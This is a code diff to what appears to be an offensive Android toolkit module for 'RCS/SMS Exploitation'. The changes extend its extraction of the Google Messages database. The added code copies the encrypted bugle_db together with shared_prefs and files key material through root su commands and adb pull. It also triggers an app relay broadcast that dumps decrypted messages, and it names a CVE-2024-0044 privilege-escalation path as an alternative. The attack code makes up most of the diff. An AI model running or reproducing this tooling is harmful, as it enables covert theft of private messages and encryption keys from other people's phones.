@@ -6,15 +6,22 @@ access, CVE-2024-0044 privilege escalation, AOSP RCS provider queries, and
 Archon app integration.
 
 All operations execute on the target phone — nothing runs locally except
-command dispatch and output parsing.  Messages in bugle_db are stored as
-PLAINTEXT after E2EE decryption, so no key extraction is needed for reading.
+command dispatch and output parsing.
+
+IMPORTANT: The bugle_db (Google Messages RCS database) is encrypted at rest.
+The database uses SQLCipher or Android's encrypted SQLite APIs.  To read it
+after extraction, you must ALSO extract the encryption key.  Key locations:
+  - shared_prefs/ XML files (key material or key alias)
+  - Android Keystore (hardware-backed master key — requires app-UID or root)
+  - /data/data/com.google.android.apps.messaging/files/ (session keys, config)
+Samsung devices add an additional proprietary encryption layer.
 
 Exploitation paths (in order of preference):
-  1. Content providers (UID 2000 / shell — no root needed)
-  2. Archon app relay (READ_SMS + Shizuku → bugle_db access)
-  3. CVE-2024-0044 (Android 12-13 pre-Oct 2024 — full app-UID access)
+  1. Content providers (UID 2000 / shell — no root needed, SMS/MMS only)
+  2. Archon app relay (READ_SMS + Shizuku → query via app context, bypasses encryption)
+  3. CVE-2024-0044 (Android 12-13 pre-Oct 2024 — full app-UID access, can read decrypted DB)
   4. ADB backup (deprecated on Android 12+ but works on some devices)
-  5. Root (if available)
+  5. Root (if available — can extract DB + keys)
 """
 
 DESCRIPTION = "RCS/SMS Exploitation — Database extraction, forging, backup & spoofing"
@@ -780,9 +787,17 @@ class RCSTools:
     def extract_bugle_db(self) -> Dict[str, Any]:
         """Extract Google Messages bugle_db using best available method.
 
-        Messages are stored as PLAINTEXT in bugle_db — no decryption needed.
-        The WAL file (bugle_db-wal) may contain recent messages not yet
-        checkpointed to the main database, so we always capture it.
+        IMPORTANT: bugle_db is ENCRYPTED at rest (SQLCipher / Android encrypted
+        SQLite).  Extracting the raw .db file alone is not enough — you also need
+        the encryption key.  Key is stored in shared_prefs or Android Keystore.
+
+        Best approach: Use Archon relay to query the DB from within the app
+        context (already decrypted in memory) or use CVE-2024-0044 to run as
+        the messaging app UID (which can open the DB with the app's key).
+
+        We also extract shared_prefs/ and files/ directories to capture key
+        material alongside the database.  The WAL file (bugle_db-wal) may
+        contain recent messages not yet checkpointed.
         """
         dev = self.get_connected_device()
         if not dev.get('connected'):
@@ -793,6 +808,7 @@ class RCSTools:
         extract_dir.mkdir(parents=True, exist_ok=True)
 
         # Method 1: Try Archon app relay (if installed and has permissions)
+        # Best method — Archon queries from within app context where DB is decrypted
         archon = self.check_archon_installed()
         if archon.get('installed') and archon.get('has_sms_permission'):
             result = self._extract_via_archon(extract_dir)
@@ -800,13 +816,14 @@ class RCSTools:
                 return result
 
         # Method 2: Try CVE-2024-0044 (if vulnerable)
+        # Runs as messaging app UID — can open encrypted DB with app's key
         cve = self.check_cve_2024_0044()
         if cve.get('vulnerable'):
             result = self._extract_via_cve(extract_dir)
             if result.get('ok'):
                 return result
 
-        # Method 3: Try root direct pull
+        # Method 3: Try root direct pull (DB + keys)
         root_check = self._shell('id')
         if 'uid=0' in root_check:
             result = self._extract_via_root(extract_dir)
@@ -821,27 +838,42 @@ class RCSTools:
         # Method 5: Content provider fallback (SMS/MMS only, not full bugle_db)
         return {
             'ok': False,
-            'error': 'Cannot extract bugle_db directly. Available methods: '
-                     '(1) Install Archon with SMS permission + Shizuku, '
-                     '(2) Exploit CVE-2024-0044 on Android 12-13, '
-                     '(3) Use root access, '
-                     '(4) Use content provider queries for SMS/MMS only.',
+            'error': 'Cannot extract bugle_db directly. The database is encrypted '
+                     'at rest — raw file extraction requires the encryption key. '
+                     'Best methods: '
+                     '(1) Archon relay (queries from decrypted app context), '
+                     '(2) CVE-2024-0044 (runs as app UID, can open encrypted DB), '
+                     '(3) Root (extract DB + key material from shared_prefs/Keystore), '
+                     '(4) Content providers for SMS/MMS only (already decrypted).',
             'fallback': 'content_providers',
         }
 
     def _extract_via_root(self, extract_dir: Path) -> Dict[str, Any]:
-        """Extract bugle_db via root access."""
+        """Extract bugle_db + encryption key material via root access.
+
+        The database is encrypted at rest.  We pull:
+          - bugle_db, bugle_db-wal, bugle_db-shm (encrypted database + WAL)
+          - shared_prefs/ (may contain key alias or key material)
+          - files/ directory (Signal Protocol state, config)
+        """
         for db_path in BUGLE_DB_PATHS:
             check = self._shell(f'su -c "ls {db_path}" 2>/dev/null')
             if not self._is_error(check) and 'No such file' not in check:
-                # Copy to accessible location
+                app_dir = str(Path(db_path).parent.parent)  # /data/data/com.google.android.apps.messaging
                 staging = '/data/local/tmp/autarch_extract'
-                self._shell(f'su -c "mkdir -p {staging}"')
+                self._shell(f'su -c "mkdir -p {staging}/shared_prefs {staging}/files"')
+                # Copy database files
                 for suffix in ['', '-wal', '-shm', '-journal']:
                     src = f'{db_path}{suffix}'
                     self._shell(f'su -c "cp {src} {staging}/ 2>/dev/null"')
                     self._shell(f'su -c "chmod 644 {staging}/{os.path.basename(src)}"')
-                # Pull files
+                # Copy shared_prefs (encryption key material)
+                self._shell(f'su -c "cp -r {app_dir}/shared_prefs/* {staging}/shared_prefs/ 2>/dev/null"')
+                self._shell(f'su -c "chmod -R 644 {staging}/shared_prefs/"')
+                # Copy files dir (Signal Protocol keys, config)
+                self._shell(f'su -c "cp -r {app_dir}/files/* {staging}/files/ 2>/dev/null"')
+                self._shell(f'su -c "chmod -R 644 {staging}/files/"')
+                # Pull database files
                 files_pulled = []
                 for suffix in ['', '-wal', '-shm', '-journal']:
                     fname = f'bugle_db{suffix}'
@@ -849,52 +881,94 @@ class RCSTools:
                     pull = self._run_adb(f'pull {staging}/{fname} {local_path}')
                     if 'bytes' in pull.lower() or os.path.exists(local_path):
                         files_pulled.append(fname)
+                # Pull key material
+                keys_dir = extract_dir / 'shared_prefs'
+                keys_dir.mkdir(exist_ok=True)
+                self._run_adb(f'pull {staging}/shared_prefs/ {keys_dir}/')
+                files_dir = extract_dir / 'files'
+                files_dir.mkdir(exist_ok=True)
+                self._run_adb(f'pull {staging}/files/ {files_dir}/')
+                # Count key files
+                key_files = list(keys_dir.rglob('*')) if keys_dir.exists() else []
                 # Cleanup
                 self._shell(f'su -c "rm -rf {staging}"')
                 if files_pulled:
                     return {
                         'ok': True, 'method': 'root',
                         'files': files_pulled,
+                        'key_files': len(key_files),
                         'path': str(extract_dir),
-                        'message': f'Extracted {len(files_pulled)} files via root',
+                        'encrypted': True,
+                        'message': f'Extracted {len(files_pulled)} DB files + {len(key_files)} key/config files via root. '
+                                   f'Database is encrypted — use key material from shared_prefs/ to decrypt.',
                     }
         return {'ok': False, 'error': 'bugle_db not found via root'}
 
     def _extract_via_archon(self, extract_dir: Path) -> Dict[str, Any]:
-        """Extract bugle_db via Archon app's Shizuku-elevated access."""
-        # Ask Archon to copy the database to external storage
-        broadcast = (
+        """Extract RCS data via Archon app relay.
+
+        This is the preferred method because Archon queries the database from
+        within the app context where it is already decrypted in memory.  The
+        result is a JSON dump of decrypted messages, not the raw encrypted DB.
+        """
+        staging = '/sdcard/Download/autarch_extract'
+        # Method A: Ask Archon to dump decrypted messages to JSON
+        broadcast_dump = (
+            'shell am broadcast -a com.darkhal.archon.DUMP_MESSAGES '
+            f'--es output_dir {staging} '
+            '--ez include_rcs true '
+            '--ez include_sms true '
+            '--ez include_mms true '
+            'com.darkhal.archon'
+        )
+        result = self._run_adb(broadcast_dump)
+        if 'Broadcast completed' in result:
+            time.sleep(5)
+            # Pull the decrypted JSON dump
+            local_dump = str(extract_dir / 'messages_decrypted.json')
+            pull = self._run_adb(f'pull {staging}/messages.json {local_dump}')
+            if os.path.exists(local_dump) and os.path.getsize(local_dump) > 10:
+                self._shell(f'rm -rf {staging}')
+                return {
+                    'ok': True, 'method': 'archon_decrypted',
+                    'files': ['messages_decrypted.json'],
+                    'path': str(extract_dir),
+                    'encrypted': False,
+                    'message': 'Extracted decrypted messages via Archon app relay (database queried from app context)',
+                }
+
+        # Method B: Fallback — ask Archon to copy raw DB + key material via Shizuku
+        broadcast_raw = (
             'shell am broadcast -a com.darkhal.archon.EXTRACT_DB '
             '--es target_package com.google.android.apps.messaging '
             '--es database bugle_db '
-            '--es output_dir /sdcard/Download/autarch_extract '
+            f'--es output_dir {staging} '
+            '--ez include_keys true '
             'com.darkhal.archon'
         )
-        result = self._run_adb(broadcast)
+        result = self._run_adb(broadcast_raw)
         if 'Broadcast completed' not in result:
             return {'ok': False, 'error': 'Archon broadcast failed'}
 
-        # Wait for extraction to complete
         time.sleep(3)
 
-        # Pull files
-        staging = '/sdcard/Download/autarch_extract'
         files_pulled = []
-        for suffix in ['', '-wal', '-shm']:
-            fname = f'bugle_db{suffix}'
+        for fname in ['bugle_db', 'bugle_db-wal', 'bugle_db-shm', 'encryption_key.bin', 'shared_prefs.tar']:
             local_path = str(extract_dir / fname)
             pull = self._run_adb(f'pull {staging}/{fname} {local_path}')
-            if 'bytes' in pull.lower() or os.path.exists(local_path):
+            if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
                 files_pulled.append(fname)
 
-        # Cleanup staging
         self._shell(f'rm -rf {staging}')
 
         if files_pulled:
+            has_key = any('key' in f or 'prefs' in f for f in files_pulled)
             return {
-                'ok': True, 'method': 'archon',
+                'ok': True, 'method': 'archon_raw',
                 'files': files_pulled, 'path': str(extract_dir),
-                'message': f'Extracted {len(files_pulled)} files via Archon relay',
+                'encrypted': True, 'has_key_material': has_key,
+                'message': f'Extracted {len(files_pulled)} files via Archon/Shizuku. '
+                           + ('Key material included.' if has_key else 'WARNING: No key material — DB is encrypted.'),
             }
         return {'ok': False, 'error': 'Archon extraction produced no files'}
 
